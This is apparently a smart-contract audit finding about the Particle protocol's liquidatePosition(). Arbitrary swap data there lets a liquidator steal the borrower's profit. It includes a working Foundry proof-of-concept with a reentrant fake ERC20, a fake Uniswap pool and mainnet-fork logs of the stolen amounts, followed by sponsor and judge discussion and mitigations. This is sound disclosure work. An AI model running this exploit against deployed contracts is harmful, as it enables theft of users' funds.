[H-03] liquidatePosition() liquidator can construct malicious data to steal the borrower’s profit
Submitted bybin2chen, also found byadriro, ladboy233 (1,2), andimmeas
When the Loan expires, andRenewalCutoffTimehas been set, anyone can execute the liquidation methodliquidatePosition().Execution path:liquidatePosition()->_closePosition()->Base.swap(params.data)
The problem is that thisparams.datacan be arbitrarily constructed by the liquidator.
As long as there is enoughamountReceivedafter the exchange for repayment, it will notrevert.
In this way, you can maliciously constructdataand steal the extra profit of the liquidator. (At leastamountReceivedmust be guaranteed)
Assume:
collateral + tokenPremium = 120repay minimumamountReceivedonly need 100 to swapso borrower Profit 120 - 100 = 20
create fakeErc20 and fakePool (token0 = fakeErc20,token1 = WETH)execute liquidatePosition():pool = fakePool , swapAmount = 120   (all collateral + tokenPremium)in fakeErc20.transfer() reentry execute reply 100 equivalentamountReceived(transfer to ParticlePositionManager)liquidatePosition() success , steal 120 - 100 = 20
Proof of Concept
Add toLiquidationTest.t.sol:
contractFakeErc20isERC20{boolpublicstartTransfer=false;addresspublictransferTo;uint256publictransferAmount;constructor()ERC20("","") {}functionset(bool_startTransfer,address_transferTo,uint256_transferAmount)external{startTransfer=_startTransfer;transferTo=_transferTo;transferAmount=_transferAmount;}functionmint(addressaccount,uint256amount)external{_mint(account,amount);}functiontransfer(addressto,uint256amount)publicvirtualoverridereturns(bool) {addressowner=_msgSender();_transfer(owner,to,amount);//for pay loan , usdcif(startTransfer)ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).transfer(transferTo,transferAmount);returntrue;}}FakeErc20publicfakeErc20=newFakeErc20();functionuniswapV3MintCallback(uint256amount0Owed,uint256amount1Owed,bytescalldata)external{ERC20token0=address(fakeErc20) <address(WETH) ?ERC20(fakeErc20):ERC20(address(WETH));ERC20token1=address(fakeErc20) <address(WETH) ?ERC20(address(WETH)):ERC20(fakeErc20);if(amount0Owed>0)token0.transfer(msg.sender,amount0Owed);if(amount1Owed>0)token1.transfer(msg.sender,amount1Owed);}functiontestStealProfit()public{//1. open Position_openLongPosition();_addPremium(PREMIUM_0,PREMIUM_1);vm.warp(block.timestamp+1seconds);_renewalCutoff();vm.warp(block.timestamp+7days);//2. init fake pooladdressanyone=address(0x123990088);uint256fakePoolGetETH;uint256payUsdcToLp;uint256amountToAdd;bytesmemorydata;vm.startPrank(WHALE);WETH.transfer(address(this),1000e18);fakeErc20.mint(address(this),1000e18);vm.stopPrank();IUniswapV3PoolfakePool=IUniswapV3Pool(uniswapV3Factory.createPool(address(WETH),address(fakeErc20),FEE));fakePool.initialize(TickMath.getSqrtRatioAtTick((_tickLower+_tickUpper) /2));fakePool.mint(address(this),_tickLower,_tickUpper,1e18,"");//3. compute swap amount{(,uint128token1Owed,,uint128token1Premium,,uint256collateral1) =particleInfoReader.getOwedInfo(SWAPPER,LIEN_ID);(uint40tokenId,uint128liquidity, , , , , , ) =particleInfoReader.getLien(SWAPPER,LIEN_ID);(payUsdcToLp,amountToAdd) =Base.getRequiredRepay(liquidity,tokenId);uint256amountSwap=collateral1+token1Premium-amountToAdd-token1Owed- (token1Premium*LIQUIDATION_REWARD_FACTOR/BASIS_POINT);ISwapRouter.ExactInputSingleParamsmemoryparams=ISwapRouter.ExactInputSingleParams({tokenIn:address(WETH),tokenOut:address(fakeErc20),fee:FEE,recipient:anyone,deadline:block.timestamp,amountIn:amountSwap,amountOutMinimum:0,sqrtPriceLimitX96:0});data=abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector,params);//4. execute liquidatePosition pay usdc and get ethvm.startPrank(WHALE);USDC.transfer(address(fakeErc20),payUsdcToLp);fakeErc20.set(true,address(particlePositionManager),payUsdcToLp);vm.stopPrank();uint256fakePoolEthBalance=WETH.balanceOf(address(fakePool));vm.startPrank(anyone);particlePositionManager.liquidatePosition(DataStruct.ClosePositionParams({lienId:uint96(LIEN_ID),amountSwap:amountSwap,data:data}),SWAPPER);vm.stopPrank();fakePoolGetETH=WETH.balanceOf(address(fakePool)) -fakePoolEthBalance;}//5. show steal usdcconsole.log("steal eth :",fakePoolGetETH);console.log("pay usdc:",payUsdcToLp/1e6);uint256usdcBefore=USDC.balanceOf(address(fakePool));_swap(address(fakePool),address(WETH),address(USDC),FEE,fakePoolGetETH);//Simplify: In reality can use fakeErc20 swap ethconsole.log("steal eth swap to usdc:",(USDC.balanceOf(address(fakePool)) -usdcBefore) /1e6);console.log("steal usdc:",(USDC.balanceOf(address(fakePool)) -usdcBefore-payUsdcToLp)/1e6);}
forge test -vvv --match-test testStealProfit --fork-url https://eth-mainnet.g.alchemy.com/v2/xxx --fork-block-number 18750931Logs:steal eth : 790605367691135637pay usdc: 737steal eth swap to usdc: 1856steal usdc: 1118
Impact
Liquidator can construct malicious data to steal the borrower’s profit.
Recommended Mitigation
It is recommended to removedata.The protocol already knows thetoken0/token1andparams.amountSwapthat need to be exchanged, which is enough to construct the elements needed for swap.
wukong-particle (Particle) commented:
This is a great finding around our arbitrary swap data. The reason we have it is that we wanted to use 1inch to route for the best price when swapping.In your recommendationIt is recommended to remove data.The protocol already knows the token0/token1 and params.amountSwap that need to be exchanged, which is enough to construct the elements needed for swap.That means we use theswapExactInputinside ourBase.swapto replacedata, right?—Want to discuss more here though, is this attack applicable toanyERC20 tokens? This step:in fakeErc20.transfer() reentry execute reply 100 equivalent amountReceived (transfer to ParticlePositionManager)can’t be generally triggered for normal ERC20, right? There isn’t a callback when receiving ERC20 (unlike ERC721 on receive callback)?How often does a normal ERC20 have a customized callback to allow reentrancy like theFakeErc20in example? Thanks!
0xleastwood (Judge) commented:
Agree with this finding and it’s severity.
wukong-particle (Particle) acknowledged, but disagreed with severity and commented:
Acknowledging the issue as it indeed can happen if a malicious erc20 is designed for our protocol. But unlikely to patch completely because otherwise we wouldn’t be use 1inch or other general router.We disagree with the severity though, because this attack, at its current design, can’t apply to all ERC20 in general. Wardens please do raise concern if our understanding is incorrect here. Thanks!
0xleastwood (Judge) commented:
So to clarify, for this attack to be possible, the protocol would need to have a pool containing a malicious erc20 token and have significant liquidity in this pool? @wukong-particleCan this attack not also be possible with any token with callbacks enabled?Also, regardless of a malicious erc20 token, we could still extract significant value by sandwiching attacking the swap no?Consider the following snippet of code:functionswap(IAggregationExecutorcaller,SwapDescriptioncalldatadesc,bytescalldatadata)externalpayablereturns(uint256returnAmount,uint256gasLeft){require(desc.minReturnAmount>0,"Min return should not be 0");require(data.length>0,"data should not be empty");uint256flags=desc.flags;IERC20srcToken=desc.srcToken;IERC20dstToken=desc.dstToken;boolsrcETH=srcToken.isETH();if(flags&_REQUIRES_EXTRA_ETH!=0) {require(msg.value> (srcETH?desc.amount:0),"Invalid msg.value");}else{require(msg.value== (srcETH?desc.amount:0),"Invalid msg.value");}if(!srcETH) {_permit(address(srcToken),desc.permit);srcToken.safeTransferFrom(msg.sender,desc.srcReceiver,desc.amount);}{bytesmemorycallData=abi.encodePacked(caller.callBytes.selector,bytes12(0),msg.sender,data);// solhint-disable-next-line avoid-low-level-calls(boolsuccess,bytesmemoryresult) =address(caller).call{value:msg.value}(callData);if(!success) {revert(RevertReasonParser.parse(result,"callBytes failed: "));}}uint256spentAmount=desc.amount;returnAmount=dstToken.uniBalanceOf(address(this));if(flags&_PARTIAL_FILL!=0) {uint256unspentAmount=srcToken.uniBalanceOf(address(this));if(unspentAmount>0) {spentAmount=spentAmount.sub(unspentAmount);srcToken.uniTransfer(msg.sender,unspentAmount);}require(returnAmount.mul(desc.amount) >=desc.minReturnAmount.mul(spentAmount),"Return amount is not enough");}else{require(returnAmount>=desc.minReturnAmount,"Return amount is not enough");}addresspayabledstReceiver= (desc.dstReceiver==address(0)) ?msg.sender:desc.dstReceiver;dstToken.uniTransfer(dstReceiver,returnAmount);emitSwapped(msg.sender,srcToken,dstToken,dstReceiver,spentAmount,returnAmount);gasLeft=gasleft();}The router has been approved as a spender and can therefore transferdesc.amounttodesc.srcReceiver. Subsequently, an external call is madecallerwhich is also controlled by the liquidator. Here, they would simply have to perform the swap themselves and transfer the expected amount back to the contract. Keeping any excess. This is an issue forAggregationRouterV4and I would expect there are similar types of issues in other DEX aggregator contracts.AggregationRouterV5is also vulnerable to the same issue.functionswap(IAggregationExecutorexecutor,SwapDescriptioncalldatadesc,bytescalldatapermit,bytescalldatadata)externalpayablereturns(uint256returnAmount,uint256spentAmount){if(desc.minReturnAmount==0)revertZeroMinReturn();IERC20srcToken=desc.srcToken;IERC20dstToken=desc.dstToken;boolsrcETH=srcToken.isETH();if(desc.flags&_REQUIRES_EXTRA_ETH!=0) {if(msg.value<= (srcETH?desc.amount:0))revertRouterErrors.InvalidMsgValue();}else{if(msg.value!= (srcETH?desc.amount:0))revertRouterErrors.InvalidMsgValue();}if(!srcETH) {if(permit.length>0) {srcToken.safePermit(permit);}srcToken.safeTransferFrom(msg.sender,desc.srcReceiver,desc.amount);}_execute(executor,msg.sender,desc.amount,data);spentAmount=desc.amount;// we leave 1 wei on the router for gas optimisations reasonsreturnAmount=dstToken.uniBalanceOf(address(this));if(returnAmount==0)revertZeroReturnAmount();unchecked{returnAmount--; }if(desc.flags&_PARTIAL_FILL!=0) {uint256unspentAmount=srcToken.uniBalanceOf(address(this));if(unspentAmount>1) {// we leave 1 wei on the router for gas optimisations reasonsunchecked{unspentAmount--; }spentAmount-=unspentAmount;srcToken.uniTransfer(payable(msg.sender),unspentAmount);}if(returnAmount*desc.amount<desc.minReturnAmount*spentAmount)revertRouterErrors.ReturnAmountIsNotEnough();}else{if(returnAmount<desc.minReturnAmount)revertRouterErrors.ReturnAmountIsNotEnough();}addresspayabledstReceiver= (desc.dstReceiver==address(0)) ?payable(msg.sender) :desc.dstReceiver;dstToken.uniTransfer(dstReceiver,returnAmount);}As such, I think this is vulnerable to all erc20 tokens.
wukong-particle (Particle) commented:
Hmm ok I see, this is more like a malicious pool attack rather than malicious erc20 token attack. It’s using the vulnerability from swap aggregator (e.g. the arbitrary call ofaddress(caller).call{value: msg.value}(callData);inAggregationRouterV5.To fix this, we can restrict theDEX_AGGREGATORto be Uniswap’sSwapRouter(deployed at 0xE592427A0AEce92De3Edee1F18E0157C05861564 on mainnet). This router interacts with Uniswap only (it has multicall, so we can usedatato choose multi-path if needed).Will this resolve this vulnerability? @0xleastwood @adriro @bin2chen
bin2chen (Warden) commented:
@wukong-particle I’m sorry, I didn’t quite understand what you mean. In the POC, it use Uniswap’s SwapRouter and Pool.In my personal understanding, if the liquidator still passes indata, then we need to check the security of this data, but it’s quite difficult to check.
So I still keep my opinion,liquidatePosition()ignores the incomingdata, and the method constructs data internally, which is how to determine the swap slippage is a problem.
wukong-particle (Particle) confirmed and commented:
Ok understood, based on the PoC provided here and the 1inch v5 vulnerability raised by the judge, I think we should remove the raw data from input parameters altogether. We will use direct swap (with the fee as input to select which pool to execute the swap). Thanks for the discussion!
0xleastwood (Judge) commented:
So Uniswap’sSwapRoutercontract is vulnerable to something slightly different. We can control the path at which tokens are swapped, stealing any profit along the way. Additionally, all DEX aggregators would be prone to sandwich attacks.I think there can be some better input validation when it comes to performing the actual swap. If possible we should try to avoid any swaps during liquidation as this leaves the protocol open to potential bad debt accrual and issues with slippage control. Validating slippage impacts the liveness of liquidations so that is also not an ideal solution. It really depends on what should be prioritised here?